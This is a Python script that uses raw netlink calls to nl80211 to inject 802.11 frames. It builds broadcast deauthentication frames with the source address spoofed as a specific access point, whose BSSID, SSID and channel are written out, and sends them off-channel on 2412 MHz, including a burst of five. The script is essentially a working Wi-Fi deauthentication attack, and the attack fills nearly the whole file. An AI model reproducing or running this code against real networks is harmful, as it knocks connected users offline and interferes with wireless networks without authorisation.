#!/usr/bin/env python3
"""Test TX injection in STA mode with off-channel to 2412 MHz
Target: 不想上班 @ 04:67:61:D6:DC:92 ch1 (2412 MHz)
"""
import socket, struct, fcntl, time

IFNAME = b"wlan0"
BSSID = bytes.fromhex("046761d6dc92")
OWN_MAC = bytes.fromhex("5c17cfbca4e3")
TARGET_FREQ = 2412

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

# nl80211 constants
NL80211_CMD_FRAME = 55
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_WIPHY_FREQ = 38
NL80211_ATTR_FRAME = 51
NL80211_ATTR_DONT_WAIT_FOR_ACK = 142
NL80211_ATTR_OFFCHANNEL_TX_OK = 141
NL80211_ATTR_DURATION = 39

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    name = b"nl80211\x00"
    attr = struct.pack("HH", 4 + len(name), 2) + name
    if len(attr) % 4: attr += b'\x00' * (4 - len(attr) % 4)
    msg = struct.pack("BBHI", 16, 3, 0, 0) + attr
    hdr = struct.pack("IHHII", 16 + len(msg), NLM_F_REQUEST | NLM_F_ACK, 0, 1, 0)
    s.send(hdr + msg)
    data = s.recv(4096)
    s.close()
    if len(data) > 24:
        return struct.unpack_from("H", data, 24 + 4)[0]
    return None

def get_ifindex():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(s, 0x8933, struct.pack('256s', IFNAME))
    s.close()
    return struct.unpack('I', result[16:20])[0]

def nla(type_id, data):
    padded = data + b'\x00' * ((4 - len(data) % 4) % 4)
    return struct.pack("HH", 4 + len(data), type_id) + padded

def send_frame(fam_id, ifindex, frame, freq):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(5)

    attrs = b""
    attrs += nla(NL80211_ATTR_IFINDEX, struct.pack("I", ifindex))
    attrs += nla(NL80211_ATTR_WIPHY_FREQ, struct.pack("I", freq))
    attrs += nla(NL80211_ATTR_FRAME, frame)
    attrs += nla(NL80211_ATTR_DONT_WAIT_FOR_ACK, b"")

    genhdr = struct.pack("BBH", NL80211_CMD_FRAME, 1, 0)
    full_payload = genhdr + attrs

    nllen = 16 + len(full_payload)
    nlhdr = struct.pack("IHHII", nllen, fam_id, NLM_F_REQUEST | NLM_F_ACK, 1, 0)

    s.send(nlhdr + full_payload)

    try:
        resp = s.recv(4096)
    except socket.timeout:
        s.close()
        return "timeout"
    s.close()

    if len(resp) >= 20:
        msg_type = struct.unpack_from("H", resp, 4)[0]
        if msg_type == 2:  # NLMSG_ERROR
            error = struct.unpack_from("i", resp, 16)[0]
            return error
    return "unknown"

# Build deauth frame
# FC=0x00c0 (deauth), DA=broadcast, SA=AP BSSID (spoofed), BSSID=AP
deauth = struct.pack("<H", 0x00c0)      # FC: deauth
deauth += struct.pack("<H", 0x0000)      # duration
deauth += b'\xff\xff\xff\xff\xff\xff'     # DA: broadcast
deauth += BSSID                          # SA: spoofed as AP
deauth += BSSID                          # BSSID: target AP
deauth += struct.pack("<H", 0)           # seq
deauth += struct.pack("<HH", 7, 0)      # reason: class3 from nonassoc

# Build primer probe req (own SA)
probe = struct.pack("<H", 0x0040)        # FC: probe req
probe += struct.pack("<H", 0)            # duration
probe += b'\xff\xff\xff\xff\xff\xff'      # DA
probe += OWN_MAC                         # SA: own MAC
probe += b'\xff\xff\xff\xff\xff\xff'      # BSSID
probe += struct.pack("<H", 0)            # seq

fam = get_nl80211_family()
ifidx = get_ifindex()
print(f"nl80211 family={fam}, ifindex={ifidx}")

# Test 1: Send on current channel (connected freq)
print("\n--- Test 1: Deauth on current freq (should work for own MAC SA) ---")
deauth_own = struct.pack("<H", 0x00c0)
deauth_own += struct.pack("<H", 0)
deauth_own += b'\xff\xff\xff\xff\xff\xff'
deauth_own += OWN_MAC            # SA: own MAC
deauth_own += BSSID
deauth_own += struct.pack("<H", 0)
deauth_own += struct.pack("<HH", 7, 0)

rc = send_frame(fam, ifidx, deauth_own, 5240)
print(f"  Deauth (SA=own, freq=5240): rc={rc}")

# Test 2: Off-channel to 2412
print("\n--- Test 2: Off-channel deauth on 2412 MHz ---")
# First, primer
rc = send_frame(fam, ifidx, probe, TARGET_FREQ)
print(f"  Primer (freq=2412): rc={rc}")

rc = send_frame(fam, ifidx, deauth, TARGET_FREQ)
print(f"  Deauth (SA=spoofed, freq=2412): rc={rc}")

# Test 3: Multiple deauths
print("\n--- Test 3: Burst of 5 deauths on 2412 ---")
for i in range(5):
    rc = send_frame(fam, ifidx, probe, TARGET_FREQ)
    rc2 = send_frame(fam, ifidx, deauth, TARGET_FREQ)
    print(f"  #{i+1}: primer={rc}, deauth={rc2}")
    time.sleep(0.1)

print("\nDone! Check dmesg for TX activity.")
